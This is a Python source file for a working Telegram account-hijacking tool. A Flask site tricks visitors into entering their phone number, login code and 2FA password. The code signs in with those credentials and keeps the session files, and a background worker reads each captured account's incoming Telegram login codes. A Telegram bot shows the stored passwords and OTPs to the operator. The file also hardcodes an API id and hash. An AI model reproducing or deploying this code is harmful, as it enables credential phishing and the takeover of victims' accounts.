import os
import re
import sqlite3
import asyncio
import threading
import logging
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# Telegram Bot Library
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ====== LOGGING ======
logging.basicConfig(
    level=logging.DEBUG,  # bisa INFO kalau terlalu rame
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# ========== KONFIG ==========
api_id = int(os.getenv("API_ID", 16047851))
api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "your-bot-token")

# Pakai folder tmp supaya aman di Railway
SESSION_DIR = "/tmp/sessions"
DB_FILE = "/tmp/data.db"

os.makedirs(SESSION_DIR, exist_ok=True)

# ====== DB INIT ======
def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                phone TEXT PRIMARY KEY,
                otp TEXT,
                password TEXT
            )
        """)
        conn.commit()
        conn.close()
        logger.info("Database initialized")
    except Exception as e:
        logger.error(f"init_db error: {e}")

def save_user(phone, otp=None, password=None):
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO users (phone, otp, password)
            VALUES (?, ?, ?)
            ON CONFLICT(phone) DO UPDATE SET otp=excluded.otp, password=excluded.password
        """, (phone, otp, password))
        conn.commit()
        conn.close()
        logger.info(f"Simpan user {phone}, otp={otp}, password={password}")
    except Exception as e:
        logger.error(f"Error save_user: {e}")

def get_user(phone):
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cur = conn.cursor()
        cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
        row = cur.fetchone()
        conn.close()
        logger.debug(f"Ambil user {phone}: {row}")
        return row
    except Exception as e:
        logger.error(f"get_user error: {e}")
        return None

def get_all_users():
    try:
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cur = conn.cursor()
        cur.execute("SELECT phone FROM users")
        rows = cur.fetchall()
        conn.close()
        return [r[0] for r in rows]
    except Exception as e:
        logger.error(f"get_all_users error: {e}")
        return []

# ====== Helper session files ======
def remove_session_files(phone_base: str):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_base}."):
            try:
                os.remove(os.path.join(SESSION_DIR, fn))
                logger.debug(f"Hapus session file {fn}")
            except Exception as e:
                logger.warning(f"Gagal hapus {fn}: {e}")

def finalize_pending_session(phone_base: str):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_base}.pending"):
            src = os.path.join(SESSION_DIR, fn)
            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
            try:
                os.rename(src, dst)
                logger.debug(f"Finalize session {src} -> {dst}")
            except Exception as e:
                logger.warning(f"Gagal finalize {fn}: {e}")

# ====== FLASK ROUTES ======
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone", "").strip()
        if not phone:
            flash("Masukkan nomor telepon.", "error")
            return redirect(url_for("login"))

        session["phone"] = phone
        remove_session_files(phone)

        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def send_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            sent = await client.send_code_request(phone)
            session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        try:
            asyncio.run(send_code())
            logger.info(f"OTP dikirim ke {phone}")
            flash("OTP telah dikirim ke Telegram Anda.")
            return redirect(url_for("otp"))
        except Exception as e:
            logger.error(f"Error kirim OTP ke {phone}: {e}")
            flash(f"Error kirim OTP: {e}", "error")
            return redirect(url_for("login"))
    return render_template("login.html")

@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        logger.warning("Tidak ada phone di session saat akses /otp")
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp", "").strip()
        logger.debug(f"Verifikasi OTP {code} untuk {phone}")
        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=session["phone_code_hash"])
                finalize_pending_session(phone)
                save_user(phone, otp=code)
                await client.disconnect()
                return {"ok": True, "need_password": False}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_password": True}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "OTP salah"}
            except Exception as e:
                logger.error(f"verify_code error {phone}: {e}")
                return {"ok": False, "error": str(e)}

        res = asyncio.run(verify_code())
        if res["ok"]:
            if res.get("need_password"):
                session["need_password"] = True
                flash("Akun ini butuh password (2FA).", "info")
                return redirect(url_for("password"))
            else:
                flash("Login berhasil ✅", "success")
                return redirect(url_for("success"))
        else:
            flash(res.get("error", "Gagal verifikasi OTP"), "error")
            return redirect(url_for("otp"))
    return render_template("otp.html")

@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if not session.get("need_password"):
        return redirect(url_for("success"))

    if request.method == "POST":
        password_input = request.form.get("password", "")
        logger.debug(f"Verifikasi password untuk {phone}")
        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_password():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(password=password_input)
                finalize_pending_session(phone)
                save_user(phone, password=password_input)
                await client.disconnect()
                return {"ok": True}
            except PasswordHashInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "Password salah"}
            except Exception as e:
                logger.error(f"verify_password error {phone}: {e}")
                return {"ok": False, "error": str(e)}

        res = asyncio.run(verify_password())
        if res["ok"]:
            flash("Login berhasil ✅", "success")
            return redirect(url_for("success"))
        else:
            flash(res["error"], "error")
            return redirect(url_for("password"))
    return render_template("password.html")

@app.route("/success")
def success():
    return render_template("success.html", phone=session.get("phone"))

# ======= WORKER =======
async def forward_handler(event, client_name):
    text_msg = getattr(event, "raw_text", "")
    sender = await event.get_sender()
    if sender.id != 777000:
        return

    otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
    if otp_match:
        otp_code = otp_match[0]
        logger.info(f"OTP {otp_code} diterima untuk {client_name}")
        save_user(client_name, otp=otp_code)

async def worker_main():
    clients = {}
    while True:
        for fn in os.listdir(SESSION_DIR):
            if not fn.endswith(".session") or ".pending" in fn:
                continue

            base = fn[:-len(".session")]
            if base in clients:
                continue

            client = TelegramClient(os.path.join(SESSION_DIR, base), api_id, api_hash)
            await client.connect()
            if not await client.is_user_authorized():
                await client.disconnect()
                continue

            @client.on(events.NewMessage)
            async def _handler(event, fn=base):
                await forward_handler(event, fn)

            clients[base] = client
            asyncio.create_task(client.run_until_disconnected())
            logger.info(f"Worker aktif untuk {base}")
        await asyncio.sleep(5)

def start_worker():
    threading.Thread(target=lambda: asyncio.run(worker_main()), daemon=True).start()

# ======= TELEGRAM BOT =======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users()
    if not users:
        await update.message.reply_text("Belum ada nomor yang login.")
        return

    for phone in users:
        keyboard = [
            [
                InlineKeyboardButton("Cek Password", callback_data=f"pass:{phone}"),
                InlineKeyboardButton("Cek OTP", callback_data=f"otp:{phone}"),
            ]
        ]
        await update.message.reply_text(
            f"📱 Nomor: {phone}", reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    cmd, phone = query.data.split(":")
    user = get_user(phone)
    if not user:
        await query.edit_message_text("Nomor tidak ditemukan di database.")
        return

    _, otp, password = user
    if cmd == "pass":
        if password:
            await query.edit_message_text(f"🔑 Password {phone}: {password}")
        else:
            await query.edit_message_text(f"ℹ️ Nomor {phone} tidak menggunakan password.")
    elif cmd == "otp":
        if otp:
            await query.edit_message_text(f"📩 OTP terakhir untuk {phone}: {otp}")
        else:
            await query.edit_message_text(f"⚠️ OTP belum tersedia untuk {phone}.")

def start_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    threading.Thread(target=application.run_polling, daemon=True).start()

# ======= MAIN =======
if __name__ == "__main__":
    init_db()
    start_worker()
    start_bot()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
